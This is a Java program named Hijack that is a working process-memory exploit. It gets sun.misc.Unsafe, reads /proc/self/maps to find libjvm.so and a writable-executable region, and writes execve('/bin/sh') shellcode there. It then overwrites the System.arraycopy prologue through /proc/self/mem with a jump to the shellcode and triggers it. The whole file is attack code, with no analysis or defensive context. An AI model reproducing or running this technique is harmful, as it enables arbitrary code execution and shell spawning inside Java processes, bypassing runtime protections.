import java.io.RandomAccessFile;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import sun.misc.Unsafe;

public final class Hijack {
    static Unsafe U;
    static final long ARRAYCOPY_OFF = 0xa83990L;

    public static void main(String[] a) throws Exception {
        Field f = Unsafe.class.getDeclaredField("theUnsafe");
        f.setAccessible(true);
        U = (Unsafe) f.get(null);

        List<String> maps = Files.readAllLines(Path.of("/proc/self/maps"));

        long base = -1;
        for (String l : maps)
            if (l.contains("libjvm.so") && l.split("\\s+")[2].equals("00000000")) {
                base = Long.parseUnsignedLong(l.split("-")[0], 16); break;
            }
        if (base < 0) { System.out.println("libjvm base not found"); return; }

        long[] best = null;
        for (String l : maps) {
            if (!l.contains("rwx")) continue;
            String[] r = l.split("\\s+")[0].split("-");
            long s = Long.parseUnsignedLong(r[0], 16), e = Long.parseUnsignedLong(r[1], 16);
            if (best == null || e - s > best[1] - best[0]) best = new long[]{s, e};
        }
        if (best == null) { System.out.println("no rwx region"); return; }

        long patch = base + ARRAYCOPY_OFF;
        long sc = best[1] - 0x1000;
        System.out.printf("libjvm base=%016x%n patch=%016x%n shellcode=%016x (rwx %016x-%016x)%n",
                base, patch, sc, best[0], best[1]);

        byte[] orig = new byte[8];
        for (int i = 0; i < 8; i++) orig[i] = U.getByte(patch + i);
        StringBuilder o = new StringBuilder();
        for (byte b : orig) o.append(String.format("%02x", b & 0xff));
        System.out.println("orig prologue: " + o);

        byte[] shell = {
            0x48, 0x31, (byte) 0xd2, 0x52,
            0x48, (byte) 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,
            0x53, 0x48, (byte) 0x89, (byte) 0xe7,
            0x48, 0x31, (byte) 0xf6,
            0x31, (byte) 0xc0, (byte) 0xb0, 0x3b, 0x0f, 0x05
        };
        for (int i = 0; i < shell.length; i++) U.putByte(sc + i, shell[i]);
        System.out.println("shellcode written (" + shell.length + " bytes)");

        StringBuilder chk = new StringBuilder();
        for (int i = 0; i < shell.length; i++) chk.append(String.format("%02x", U.getByte(sc + i) & 0xff));
        System.out.println("shellcode readback ok=" + chk.toString().startsWith("4831d25248bb2f62696e"));

        int rel = (int) (sc - (patch + 5));
        System.out.printf("jmp rel32 = %d%n", rel);

        try (RandomAccessFile m = new RandomAccessFile("/proc/self/mem", "rw")) {
            m.seek(patch);
            m.write(0xE9);
            m.write((rel) & 0xff);
            m.write((rel >> 8) & 0xff);
            m.write((rel >> 16) & 0xff);
            m.write((rel >> 24) & 0xff);
        }
        System.out.println("patched, triggering...");

        Object[] src = {"x"};
        Object[] dst = new Object[1];
        trigger(src, dst);
        System.out.println("still alive (execve failed?)");
    }

    static void trigger(Object[] s, Object[] d) {
        System.arraycopy(s, 0, d, 0, 1);
    }
}
